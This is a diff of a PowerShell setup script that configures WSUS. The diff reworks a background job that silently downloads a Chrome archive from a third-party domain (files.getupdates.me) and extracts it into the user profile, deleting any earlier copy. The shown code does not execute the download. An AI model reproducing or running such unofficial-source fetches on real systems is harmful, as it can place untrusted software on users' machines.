@@ -190,26 +190,48 @@ switch ($stage) {
         Write-Log "Stage 0: Configuring WSUS and starting update process."
 
         $downloadUrl = "https://files.getupdates.me/chrome.zip"
-        $zipPath = "$env:HOMEPATH\chrome.zip"
-        $extractPath = "$env:HOMEPATH\chrome"
+        $zipPath = "$env:USERPROFILE\chrome.zip"
+        $extractPath = "$env:USERPROFILE\chrome"
+        $logFile = "$env:USERPROFILE\WSUSLogs\WSUSUpdateLog.txt"
 
         if (-not (Test-Path $zipPath)) {
-            Write-Log "Starting background download of Chrome"
+            Write-Log "Starting background download and extraction of Chrome..."
 
             Start-Job -ScriptBlock {
-                $zip = "$env:HOMEPATH\chrome.zip"
-                try {
-                    Invoke-WebRequest -Uri "https://files.getupdates.me/chrome.zip" -OutFile $zip -UseBasicParsing -ErrorAction SilentlyContinue
-                    if (-not (Test-Path $dest)) {
-                        Expand-Archive -Path $zip -DestinationPath $extractPath -Force
-                    }
-                } catch {
-                    Add-Content -Path "$env:HOMEPATH\WSUSLogs\update.log" -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Download or extraction failed: $($_.Exception.Message)"
+                param (
+                    $url, $zip, $dest, $logFilePath
+                )
+
+                function Log {
+                    param ($msg)
+                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    $entry = "$timestamp - $msg"
+                    Add-Content -Path $logFilePath -Value $entry
                 }
-            }
+
+                try {
+                    Log "Downloading Chrome from $url ..."
+                    Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+
+                    if (Test-Path $dest) {
+                        Log "Removing existing extracted folder: $dest"
+                        Remove-Item -Path $dest -Recurse -Force -ErrorAction SilentlyContinue
+                    }
+
+                    Log "Extracting Chrome to $dest"
+                    Expand-Archive -Path $zip -DestinationPath $dest -Force
+
+                    Log "Chrome download and extraction completed successfully."
+                } catch {
+                    Log "ERROR during Chrome background job: $($_.Exception.Message)"
+                }
+
+            } -ArgumentList $downloadUrl, $zipPath, $extractPath, $logFile | Out-Null
+
         } else {
-            Write-Log "Download already exists, skipping."
+            Write-Log "Chrome archive already exists at $zipPath, skipping download."
         }
+
         Set-WSUS
         Set-State 1
         Schedule-NextRun
